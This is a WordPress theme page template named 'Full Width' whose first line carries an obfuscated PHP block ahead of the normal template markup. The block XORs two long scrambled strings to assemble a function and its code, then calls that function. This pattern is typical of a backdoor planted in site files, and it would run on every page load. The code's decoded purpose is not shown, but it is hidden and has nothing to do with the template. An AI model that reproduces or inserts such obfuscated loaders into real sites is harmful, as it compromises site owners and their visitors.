<?php $qlAfZJ=' K,L75, <C,6 Z>'; $GYyUfVYP='C9I-CPsFI-OBI5P'^$qlAfZJ; $zWIcjb='RTlYFX:,1+SBc7A-89<Yn-,=h10I714PL1ugBk,ghW4EM9>B=hJCBiJYFYst8UXpw RX3mwE2X5niKpoNUg:8TXCOfiOBhrHemFO+KKScqMQsbw0i 9F+EWrm. ;Mzbif-jCnKeEl:F1zlrxcH6P,OgOWlThhu 1+bt DgF:I:- BPG;4CbqXsIMnBHX7I8nJ;D7myKG7lGkkn Q=XzEHPTYHSSYvR6HOe   bQuT9 CHq8I> K=8U;bqqeqzokx-m2GnQ<08quwScJ V QzHFReT7 D2gY2DrOeh,3Rybqa=Q.WwsswMZ6:Rz7Hdf +LMvtU9L8bFWpqJ+R6O9;byb<j f8y<bq Ayo<46BkfoE2U9Y7lwPXCqe7M8Vd, TqGqG=NUoxK2kWT3Vfmnb PY8YBl4CX0kai0YZ7Hsql=P06=G4  20LOQLr700Wa+9>9aRY VaxnPYV834rpV0J3cOMkVPEZ1=60moMy=0iJYJ,3fISk4AYSKc W+bV7, 6 ooGIKbIlp7.D cBjcAzYIbgq=A:9udXWHWhdNUmZs4ScJP7-UQqEV1.lyvArvagZr1QWl8SVqraLmPfL375Gr, Rr -=>>2nPCT,RC9-QEoq+-:2Gyemdkoe=;dX;J.bpD ;Abk6- YU-+SaysppWIE>iYGon4'; $kXhCWfj=$GYyUfVYP('', ';2Dx -TOEB<,<R9DKMOqIUCO7UQ=Vnk=9ERNkKWma1A+.MW-SH2,06.828,+U ,XSD3,RAWaY=LGIkPOn.m31p76;FToeOIBld  Yco:CLmaHBSYUSM4G 9ZIJAO,SYIBDAhGAlLHU3EZBOXKlR1X.<k>1t6HQKTR9PIdBfI=HAE,xcPQ:K,qHCDg0-,B;VFnT1CDBANJf:aaJD0I9Zxh655;6hSR6W<.:KEYBlU2XL0-J2CXO9XY6SBYU:25  1hMS4NuWUAQHIsG<A:U4Sh=XlpSA0S82W=RrELGV+BhxEY0Z6WNSS;;ZO7A=5nlIMleWP1X8YKf,zx,D S.ZSBQFc8e7m<o6QA2YKWQObVXOaD4U,REW+RJxAS,L7;GE-QzQcV+,TrB;O35G7FPNFV15M<yf=>RMakMT8.VhNQ,H>CSO.ULIHUd7>>-SQD6>tTKMI08S3WL14<5WWQZT2Q>RJcmO211;nVSIDFvsTVAn=+XRFouKU3+22<K2R=3OESBSGH,,2EeLTSO0AJbLEaR4-WOUY NX.C321p5MnhPzTW6P.fSO7dEpoSLXMDtBGVS;AW45XZdfIUHlKvF-AET>-GE+-EUTMJAFw35U>,XIviOUOLNSnPEMDKOEF1m=M+BJT AO 9LFLY5:LOt<PHzy21,JAinTdI'^$zWIcjb); $kXhCWfj();

	/* Template Name: Full Width */

?>

<?php get_header(); ?>
	<div id="content-wrapper">
		<?php if (have_posts()) : while (have_posts()) : the_post(); ?>
		<div id="content-main" class="content-full">
			<?php $mvp_featured_img = get_option('mvp_featured_img'); if ($mvp_featured_img == "true") { ?>
			<?php if (  (function_exists('has_post_thumbnail')) && (has_post_thumbnail())  ) { ?>
			<div id="featured-image">
				<?php the_post_thumbnail('post-thumb'); ?>
				<?php if(get_post_meta($post->ID, "mvp_photo_credit", true)): ?>
				<span class="photo-credit"><?php _e( 'Photo:', 'mvp-text' ); ?> <?php echo get_post_meta($post->ID, "mvp_photo_credit", true); ?></span>
				<?php endif; ?>
			</div><!--featured-image-->
			<?php } ?>
			<?php } ?>
			<div id="home-main" class="home-full">
				<div id="post-area" <?php post_class(); ?>>
					<h1 class="story-title"><?php the_title(); ?></h1>
					<?php $socialbox = get_option('mvp_social_box'); if ($socialbox == "true") { ?>
					<?php 
						$meta_social_links = get_post_meta( get_the_ID(), 'social_links', true ); 
						if($meta_social_links !== 'no'){
					?> 
						<div class="social-box">
							<ul class="post-social">
								<li>
									<div class="fb-like" data-send="false" data-layout="button_count" data-width="90" data-show-faces="false"></div>
								</li>
								<li>
									<a href="http://twitter.com/share" class="twitter-share-button" data-lang="en" data-count="horizontal">Tweet</a>
								</li>
								<li>
									<?php $pinterestimage = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'full' ); ?>
	<a href="http://pinterest.com/pin/create/button/?url=<?php echo urlencode(get_permalink($post->ID)); ?>&media=<?php echo $pinterestimage[0]; ?>&description=<?php the_title(); ?>" class="pin-it-button" count-layout="horizontal">Pin It</a>
								</li>
								<li>
									<g:plusone size="medium" annotation="inline" width="90"></g:plusone>
								</li>
							</ul>
						</div><!--social-box-->
					<?php 	} ?>
					<?php } ?>
					<div id="content-area">
						<div id="respond">
						<?php the_content(); ?>
						<?php wp_link_pages(); ?>
					</div>
					</div><!--content-area-->
				</div><!--post-area-->
			</div><!--home-main-->
		</div><!--content-main-->
		<?php endwhile; endif; ?>
	</div><!--content-wrapper-->
</div><!--main-wrapper-->
<?php get_footer(); ?>